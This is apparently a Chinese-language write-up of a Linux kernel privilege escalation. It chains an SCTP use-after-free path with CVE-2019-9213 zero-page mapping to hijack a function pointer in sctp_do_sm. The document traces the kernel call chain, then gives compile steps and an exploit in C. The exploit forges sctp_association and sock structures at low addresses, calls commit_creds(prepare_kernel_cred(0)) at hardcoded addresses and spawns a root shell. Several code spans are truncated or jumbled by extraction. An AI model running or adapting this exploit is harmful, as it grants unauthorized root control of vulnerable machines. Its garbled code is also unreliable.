            chunk = sctp_make_abort_user(asoc, msg, msg_len);
            if (!chunk)
                return -ENOMEM;
            pr_debug("%s: aborting association:%pn", __func__, asoc);
            sctp_primitive_ABORT(net, asoc, chunk);
            return 0;
        }
        return 1;
    }
这里注意：struct sock _sk = asoc- >base.sk，因为asoc是可控的（具体原因会在下面的下一部分介绍。），所以struct
sock _sk就可以任由我们摆布。
接下来设置SCTP_ABORT标志，调用sctp_make_abort_user和sctp_primitive_ABORT。
    struct sctp_chunk *sctp_make_abort_user(const struct sctp_association *asoc,
                        struct msghdr *msg,
                        size_t paylen)
    {
        struct sctp_chunk *retval;
        void *payload = NULL;
        int err;
        retval = sctp_make_abort(asoc, NULL,
                     sizeof(struct sctp_errhdr) + paylen);
        if (!retval)
            goto err_chunk;
        if (paylen) {
            /* Put the msg_iov together into payload.  */
            payload = kmalloc(paylen, GFP_KERNEL);
            if (!payload)
                goto err_payload;
            err = memcpy_from_msg(payload, msg, paylen);
            if (err state : SCTP_STATE_CLOSED; 
        ep = asoc ? asoc->ep : NULL; 
        error = sctp_do_sm(net, event_type, subtype, state, ep, asoc,    
                   arg, GFP_KERNEL); 
        return error; 
    }
可以看到他调用了sctp_do_sm这个状态随机处理函数：
    int sctp_do_sm(struct net *net, enum sctp_event event_type,
               union sctp_subtype subtype, enum sctp_state state,
               struct sctp_endpoint *ep, struct sctp_association *asoc,
               void *event_arg, gfp_t gfp)
    {
        ......
        state_fn = sctp_sm_lookup_event(net, event_type, state, subtype);
        sctp_init_cmd_seq(&commands);
        debug_pre_sfn();
        status = state_fn->fn(net, ep, asoc, subtype, event_arg, &commands);
        debug_post_sfn();
        error = sctp_side_effects(event_type, subtype, state,
                      ep, &asoc, event_arg, status,
                      &commands, gfp);
        debug_post_sfx();
        return error;
    }
而sctp_do_sm的参数：net、state、ep、asoc都是可以被我们控制的。  
这里有个很明显的指针调用：
        status = state_fn->fn(net, ep, asoc, subtype, event_arg, &commands);
如果我们可以控制state_fn，就可以实现任意地址调用。  
state_fn由sctp_sm_lookup_event函数返回，我们继续跟入：
    const struct sctp_sm_table_entry *sctp_sm_lookup_event(
                        struct net *net,
                        enum sctp_event event_type,
                        enum sctp_state state,
                        union sctp_subtype event_subtype)
    {
        switch (event_type) {
        case SCTP_EVENT_T_CHUNK:
            return sctp_chunk_event_lookup(net, event_subtype.chunk, state);
        case SCTP_EVENT_T_TIMEOUT:
            return DO_LOOKUP(SCTP_EVENT_TIMEOUT_MAX, timeout,
                     timeout_event_table);
        case SCTP_EVENT_T_OTHER:
            return DO_LOOKUP(SCTP_EVENT_OTHER_MAX, other,
                     other_event_table);
        case SCTP_EVENT_T_PRIMITIVE:
            return DO_LOOKUP(SCTP_EVENT_PRIMITIVE_MAX, primitive,
                     primitive_event_table);
        default:
            /* Yikes!  We got an illegal event type.  */
            return &bug;
        }
    }
在sctp_primitive_ABORT里面就已经设置event为SCTP_EVENT_T_PRIMITIVE，所以接下来会调用DO_LOOKUP函数。
    #define DO_LOOKUP(_max, _type, _table)                    
    ({                                    
        const struct sctp_sm_table_entry *rtn;                
        if ((event_subtype._type > (_max))) {                
            pr_warn("table %p possible attack: event %d exceeds max %dn", 
                _table, event_subtype._type, _max);        
            rtn = &bug;                        
        } else                                
            rtn = &_table[event_subtype._type][(int)state];        
        rtn;                                
    })
调试一下：
可以发现ecx是state，所以我们可以控制state_fn。
小结一下调用链：
链里面还有几个函数没有分析，我们放到下面的结合部分分析：
###  cve的结合
启明星辰ADLab公开发布的分析文章里关于asoc的分析有一点问题。  
这里我们来分析一下如何控制asoc：
    void sctp_association_free(struct sctp_association *asoc)
    {
        struct sock *sk = asoc->base.sk;
        struct sctp_transport *transport;
        struct list_head *pos, *temp;
        int i;
        /* Only real associations count against the endpoint, so
         * don't bother for if this is a temporary association.
         */
        if (!list_empty(&asoc->asocs)) {
            list_del(&asoc->asocs);
            /* Decrement the backlog value for a TCP-style listening
             * socket.
             */
            if (sctp_style(sk, TCP) && sctp_sstate(sk, LISTENING))
                sk->sk_ack_backlog--;
        }
        ..........
    }
sctp_association_free中对asoc进行了list_del操作。
    static inline void list_del(struct list_head *entry)
    {
        __list_del_entry(entry);
        entry->next = LIST_POISON1;
        entry->prev = LIST_POISON2;
    }
LIST_POISON1是0x100。我们看一下汇编代码:
    mov     eax,[edi+44h]
    sub     eax,44h
    mov     edi,eax
    cmp     [ebp-84h],eax
    jz      ...
这里在遍历到下一个节点的时候会计算asoc，0x100-0x44=0xbc
CVE-2019-9213可以映射0抵制空间，那么我们就可以在0xbc处伪造结构，从而实现控制asoc，而上面分析的fn可控，可以劫持任意地址，这样就可以进行提权了。
这里调试一下偏移：
    struct sock{
        char padding1[0x24];
        void *net;
        char padding2[0x278];
        int type;
    };
    struct sctp_association{
        char padding1[0x18];
        struct sock *sk;
        char padding2[0x190];
        int state;
    };
接下来是asoc的flags：
    enum sctp_sinfo_flags {
        SCTP_UNORDERED        = (1 
  2. chroot debian_32
  3. apt install gcc libsctp-dev
编译exp：
  * 首先进入32位文件系统：chroot debian_32
  * 将exp.c放入文件系统中。 sudo cp exp.c /home/parallels/debian_32/exp.c
  * 编译exp.c： gcc exp.c -lpthread -lsctp -static -o exp
挂载放入exp：
  * mkdir rootfs
  * sudo mount rootfs.img rootfs
  * sudo cp ./exp ./rootfs
  * sudo umount rootfs
## exp提权：
    #define _GNU_SOURE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include  
    #include 
    #include 
    #include 
    #include 
    #define SERVER_PORT 6666
    #define SCTP_GET_ASSOC_ID_LIST    29
    #define SCTP_RESET_ASSOC    120
    #define SCTP_ENABLE_RESET_ASSOC_REQ    0x02
    #define SCTP_ENABLE_STREAM_RESET    118
    struct sock
    {
            char pad1[0x24];
            void *net;
            char pad[0x278];
            int type;
    };
    struct sctp_association
    {
            char pad1[0x18];
            struct sock *sk;
            char pad2[0x34];
            char *ep;
            char pad3[0x158];
            int state;
    };
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1074ee0;
    void (*commit_creds)(void*) KERNCALL = (void*) 0xc1074b80;
    void templine()
    {
        commit_creds(prepare_kernel_cred(0));
        asm(    "pushl   $0x7b;"
            "pushl   $0x4000;"
            "pushl   $0x202;"
            "pushl   $0x73;"
            "pushl   $shell;"
            "iret;");
    }
    void shell()
    {
            printf("rootn");
            system("/bin/sh");
            exit(0);
    }
    void mmap_zero()
    {
        unsigned long addr = (unsigned long)mmap((void *)0x10000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
            if (addr != 0x10000)
                    err(2,"mmap failed");
            int fd = open("/proc/self/mem",O_RDWR);
            if (fd == -1)
                    err(2,"open mem failed");
            char cmd[0x100] = {0};
            sprintf(cmd, "su >&%d sk = (struct sock *)0x1000;
            sctp_ptr->sk->type = 0x2;
            sctp_ptr->state = 0x7cb094c; // offset, &_table[event_subtype._type][(int)state] = 0x3000
            sctp_ptr->ep = (char *)0x2000;
        *(sctp_ptr->ep + 0x8e) = 1;
        unsigned long* ptr4 = (unsigned long*)0x3000;
        ptr4[0] = (unsigned long)&templine;
    }
    void* client_func(void* arg)
    {
        int socket_fd;
        struct sockaddr_in serverAddr;
        struct sctp_event_subscribe event_;
        int s;
        char *buf = "test";
        if ((socket_fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP))==-1){
            perror("client socket");
            pthread_exit(0);
        }
        bzero(&serverAddr, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
        printf("send data: %sn",buf);
        if(sctp_sendmsg(socket_fd,buf,sizeof(buf),(struct sockaddr*)&serverAddr,sizeof(serverAddr),0,0,0,0,0)==-1){
            perror("client sctp_sendmsg");
            goto client_out_;
        }
    client_out_:
          //close(socket_fd);
        pthread_exit(0);
    }
    void* send_recv(int server_sockfd)
    {
        int msg_flags;
        socklen_t len = sizeof(struct sockaddr_in);
        size_t rd_sz;
        char readbuf[20]="0";
        struct sockaddr_in clientAddr;
        rd_sz = sctp_recvmsg(server_sockfd,readbuf,sizeof(readbuf),(struct sockaddr*)&clientAddr, &len, 0, &msg_flags);
        if (rd_sz > 0)
            printf("recv data: %sn",readbuf);
        rd_sz = 0;
        if(sctp_sendmsg(server_sockfd,readbuf,rd_sz,(struct sockaddr*)&clientAddr,len,0,0x44,0,0,0)state的偏移需要自己计算(环境不同)：
运行截图：